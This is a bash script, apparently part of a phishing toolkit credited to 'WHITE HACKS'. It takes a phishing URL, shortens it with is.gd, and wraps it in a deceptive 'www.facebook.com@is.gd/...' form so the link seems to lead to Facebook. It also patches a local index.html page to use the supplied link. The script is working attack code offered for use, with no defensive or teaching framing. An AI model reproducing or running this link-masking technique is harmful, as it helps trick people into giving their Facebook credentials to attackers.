#!/bin/bash
# ==============================================
#                   Variables
# ==============================================
operatingSystem=$(uname -o)
deviceArchitecture=$(uname -m)
showPath=$(pwd)
webSite="website"
subDomain="facebook"
port="8080"
file="index.html"
showDate=$(date)
words='www.facebook.com'
# ==============================================
#                  Light colors
# ==============================================
black="\e[1;30m"
blue="\e[1;34m"
green="\e[1;32m"
cyan="\e[1;36m"
red="\e[1;31m"
purple="\e[1;35m"
yellow="\e[1;33m"
white="\e[1;37m"
# ==============================================
#                  Dark colors
# ==============================================
blackDark="\e[0;30m"
blueDark="\e[0;34m"
greenDark="\e[0;32m"
cyanDark="\e[0;36m"
redDark="\e[0;31m"
purpleDark="\e[0;35m"
yellowDark="\e[0;33m"
whiteDark="\e[0;37m"
# ==============================================
#               Background colors
# ==============================================
blackBack=$(setterm -background black)
blueBack=$(setterm -background blue)
greenBack=$(setterm -background green)
cyanBack=$(setterm -background cyan)
redBack=$(setterm -background red)
yellowBack=$(setterm -background yellow)
whiteBack=$(setterm -background white)
# ==============================================
#   Requesting a phishing link from the user
# ==============================================
function linkPhish() {
    echo -e ""
    echo -e -n "${blueBack}${white} [-] 𝙀𝙉𝙏𝙀𝙍 𝘼 URL ${blackBack}➤➤➤ "${white}
    read -r lhr
    sleep 0.5

    if [[ "${words}" == "" ]]; then
        simbol=""
    else
        simbol="@"
    fi

    short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${lhr})
    echo -e "${short}" >> short.txt
    protocol=$(tail -n1 short.txt | cut -d "/" -f1)
    isgdDomain=$(tail -n1 short.txt | cut -d "/" -f4)
    isgd="${protocol}//${words}${simbol}is.gd/${isgdDomain}"
    rm short.txt
    replaceLink="http://localhost:8080"
    sed -i "s!${replaceLink}!${lhr}!g" ${webSite}/index.html
    echo -e ""
    echo -e ""
    echo -e "${blueBack}${white} [-] 𝙎𝙃𝙊𝙍𝙏 ${blackBack}➤➤➤ ${blue}${isgd}"
    echo -e ""${white}
}
# ==============================================
#              Declaring functions
# ==============================================
linkPhish
# ==============================================
#    Created by: @Darkmux - WHITE HACKS ©2023
# ==============================================
